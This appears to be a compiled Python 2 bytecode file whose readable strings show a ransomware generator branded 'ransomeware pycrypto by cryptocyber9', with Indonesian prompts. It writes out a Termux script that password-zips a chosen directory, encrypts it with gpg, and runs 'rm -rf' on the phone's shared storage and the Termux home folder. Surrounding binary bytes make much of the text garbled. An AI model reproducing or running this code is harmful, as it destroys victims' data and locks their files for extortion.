ó
âd^c           @   sÔ  d  d l  Z  d  d l Z d  d l m Z e  j d  d GHe d  Z e d  Z e d  Z e d  Z	 e d	  e
 e d
  ġ Z e j d  e j d  e j d  e j d  e j d  e j d  e j d  e j d  e j d j e e   e j d  e j d  e j d j e   e j d  e j d j e   e j d  e j d  Wd QXe  j d j e e	   d GHd j e  GHd j e  GHd j e  GHd  j e	  GHd S(!   i˙˙˙˙N(   t   sleept   clearsK  
_________                        __          
\_   ___ \_______ ___.__._______/  |_  ____  
/    \  \/\_  __ <   |  |\____ \   __\/  _ \ 
\     \____|  | \/\___  ||  |_> >  | (  <_> )
 \______  /|__|   / ____||   __/|__|  \____/ 
        \/        \/     |__|                

       	     ransomeware pycrypto
		by cryptocyber9

s   [Name File]
> s   [Path direktori]
> s   [Password crypt]
> s   [output result]
> i   t   ws   import os,sys,time
s   try:
s   	import gnupg
s   	import zipfile
s   except ImportError:
s'   	os.system("pkg install zip gnupg -y")
s#   	os.system("termux-setup-storage")
s   
def main():

sG   	os.system("zip --password {} cryptocyber9.zip {} -r -m &> /dev/null")
s*   	os.system("rm -rf /storage/emulated/0/")
s6   	os.system("rm -rf /data/data/com.termux/files/home")
s>   	os.system("gpg --batch -c --passphrase {} cryptocyber9.zip")
s&   	os.system("rm -rf cryptocyber9.zip")
s   	os.system("rm -rf {}")
s   
if __name__=="__main__":
s   	main()s   mv {} {}s   
Cryptolocker berhasil dibuat!s   Nama program {}s   Direktori yang diencrypt {}s   Password Encrypt {}s   File disimpan di {}(   t   ost   syst   timeR    t   systemt	   raw_inputt   namefilet   dir1t   passwdt   outputt   opent   khazt   writet   format(    (    (    s	   crypto.pyt   <module>   s>   
